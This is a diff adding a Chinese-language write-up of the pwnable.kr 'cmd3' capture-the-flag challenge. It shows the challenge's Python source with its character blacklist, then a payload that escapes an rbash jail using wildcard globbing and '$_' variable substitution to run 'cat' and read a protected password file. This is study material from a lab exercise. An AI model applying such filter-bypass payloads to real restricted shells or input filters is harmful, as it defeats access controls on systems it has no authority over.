@@ -177,3 +177,120 @@ io.interactive()
 ![](/images/20210319003.png)
 
 > 但是很僵硬的是，这种办法打远程打不通，用ret2shellcode才拿到了flag
+
+# [Grotesque] cmd3
+
+```
+cmd3@pwnable:~$ cat readme
+if you connect to port 9023, the "cmd3.py" script will be executed under cmd3_pwn privilege.
+type 'nc 0 9023' to play this challenge.  have fun escaping from rbash jail :)
+FYI, 'print_flag' is the program which prints out the flag of cmd3.
+```
+
+```python
+#!/usr/bin/python
+import base64, random, math
+import os, sys, time, string
+from threading import Timer
+
+def rstring(N):
+        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
+
+password = rstring(32)
+filename = rstring(32)
+
+TIME = 60
+class MyTimer():
+        global filename
+        timer=None
+        def __init__(self):
+                self.timer = Timer(TIME, self.dispatch, args=[])
+                self.timer.start()
+        def dispatch(self):
+                print 'time expired! bye!'
+                sys.stdout.flush()
+                os.system('rm flagbox/'+filename)
+                os._exit(0)
+
+def filter(cmd):
+        blacklist = '` !&|"\'*'
+        for c in cmd:
+                if ord(c)>0x7f or ord(c)<0x20: return False
+                if c.isalnum(): return False
+                if c in blacklist: return False
+        return True
+
+if __name__ == '__main__':
+        MyTimer()
+        print 'your password is in flagbox/{0}'.format(filename)
+        os.system("ls -al")
+        os.system("ls -al jail")
+        open('flagbox/'+filename, 'w').write(password)
+        try:
+                while True:
+                        sys.stdout.write('cmd3$ ')
+                        sys.stdout.flush()
+                        cmd = raw_input()
+                        if cmd==password:
+                                os.system('./flagbox/print_flag')
+                                raise 1
+                        if filter(cmd) is False:
+                                print 'caught by filter!'
+                                sys.stdout.flush()
+                                raise 1
+
+                        os.system('echo "{0}" | base64 -d - | env -i PATH=jail /bin/rbash'.format(cmd.encode('base64')))
+                        sys.stdout.flush()
+        except:
+                os.system('rm flagbox/'+filename)
+                os._exit(0)
+
+```
+
+```bash
+cmd3@pwnable:~$ nc 0 9023
+total 5840
+drwxr-x---   5 root cmd3_pwn    4096 Mar 15  2016 .
+drwxr-xr-x 115 root root        4096 Dec 22 08:10 ..
+d---------   2 root root        4096 Jan 22  2016 .bash_history
+-rwxr-x---   1 root cmd3_pwn    1421 Mar 11  2016 cmd3.py
+drwx-wx---   2 root cmd3_pwn   20480 Apr 13 22:58 flagbox
+drwxr-x---   2 root cmd3_pwn    4096 Jan 22  2016 jail
+-rw-r--r--   1 root root     5931695 Apr 13 23:50 log
+-rw-r-----   1 root root         764 Mar 10  2016 super.pl
+total 8
+drwxr-x--- 2 root cmd3_pwn 4096 Jan 22  2016 .
+drwxr-x--- 5 root cmd3_pwn 4096 Mar 15  2016 ..
+lrwxrwxrwx 1 root root        8 Jan 22  2016 cat -> /bin/cat
+lrwxrwxrwx 1 root root       11 Jan 22  2016 id -> /usr/bin/id
+lrwxrwxrwx 1 root root        7 Jan 22  2016 ls -> /bin/ls
+your password is in flagbox/V8Y4PAMYSB44V6T9OYA64J9HCLZET5AM
+cmd3$
+```
+
+总结下来就是，在以下条件的限制中，读取到 `flagbox/{32个随机字符的文件名}` 内容
+
+- rbash
+- 黑名单  `` ` !&|"\'* ``
+- 可见字符，且不为字母与数字
+
+条件限定的特别死，且由于字母数字都被ban掉了，但是仍然可以使用 `?` 来访问到文件，如 `????/?? -> jail/ls [jail/id], ????/??? -> jail/cat`
+
+然后需要考虑如何完成一次完整的命令，由于rbash的存在，不能存在 `/`，需要将命令给取出来，考虑通过构造环境变量来完成，使用 `$_` 来获取上一次执行的命令，再使用 `${}` 变量替换，在其中使用 `#` 来去掉左边的字符，如在环境中实现执行 `ls` 命令
+
+![](/images/2021414-1.png)
+
+使用同样的方法获取到cat, `????/???;__=${_#?????}`，同时由于使用的是cat，所以可以使用 `<`，完美避开了黑名单中空格的问题，接下来需要考虑的就是如何取到flag文件的文件名
+
+由于现在已经可以使用cat命令，所以考虑将文件名写入某个文件，将其cat出来然后再cat实现，可是当前目录下是没权限写的，那么可以考虑写入到tmp目录，为了避免读取到一些奇怪的文件，所以建一个目录比较好，由于filter函数的关系，可以创建一个全是下划线的文件夹 (tmp已经有好多个这种文件夹了...。索性删了一些建自己的)，然后nc后将flagbox中的文件名写入到某个文件中，这样一来就可以构造出payload
+
+```bash
+????/???        # jail/cat
+__=${_#?????}   # 获得cat
+___=$($__</???/__/?????) # cat /tmp/__/zzzzz
+$__<$___;       # cat flagbox/xxxxx
+```
+
+然后将读取到的password直接输入便可以得到flag
+
+![](/images/2021414-2.png)
